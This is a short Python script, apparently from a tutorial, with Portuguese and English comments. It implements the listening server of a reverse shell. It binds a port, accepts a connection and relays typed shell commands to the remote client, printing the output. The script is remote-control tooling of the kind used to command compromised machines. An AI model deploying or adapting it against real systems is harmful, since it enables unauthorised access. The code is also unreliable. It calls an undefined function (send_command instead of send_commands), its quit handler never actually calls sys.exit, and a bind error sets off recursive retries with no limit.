import socket        # Importa a biblioteca SOCKET para criarmos o socket responsável por estabelecer uma conexão entre 2 computadores
import sys           # Biblioteca para implementar comandos do prompt de comando do windows e linha de comando.



# Função para criar um socket. Conexão entre 2 computadores
def create_socket(): 
    try:                                                  # Usar uma Try e Except para em caso de erro uma mensagem ser exibida
        global host                                        # three global variables to be accessable from everywhere
        global port          
        global s                                           # socket variable
        host = '192.168.0.6'
        port = 9999
        s = socket.socket()                               # Storing the socket function
        
    except socket.error as msg:                             # Usar uma Try e Except para em caso de erro uma mensagem ser exibida
        print("Socket creation error: " + str(msg))



# Bind socket (vincular o ip e porta ao socket)

def bind_socket():
    try:                                                                       # Usar uma Try e Except para em caso de erro uma mensagem ser exibida
        print("Binding the port" + str(port))                                # Mostra msg dizendo que vamos fazer o binding

        s.bind((host,port))                                                  # Tentar anexar o ip e porta para conexão
        s.listen(5)


    except socket.error as msg:                                                 # Usar uma Try e Except para em caso de erro uma mensagem ser exibida
        print("Socket binding error" + str(msg) + "\n" + "Retrying...")          #mensagem da nova tentativa abaixo
        bind_socket()                                                             #chamar a função novamente no caso do erro para que tentemos novamente conectar o socket
 

 # Establish connection with a client ( socket must be listening )

def socket_accept():
    conn,address = s.accept()                                                                              # s.accept() é uma função que nos dá 2 informações importantes no retorno
                                                                                                            # 1 informação : objeto de conversação --------- 2 informação: uma lista de 2 itens que contém o IP e PORTA
                                                                                                            #
    print("Connection has been established! |" + "IP " + address[0] + "| Port" + str(address[1]))          # Address stores
    send_command(conn)
    conn.close()


def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit 
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")


def main():
    create_socket()
    bind_socket()
    socket_accept()

main()
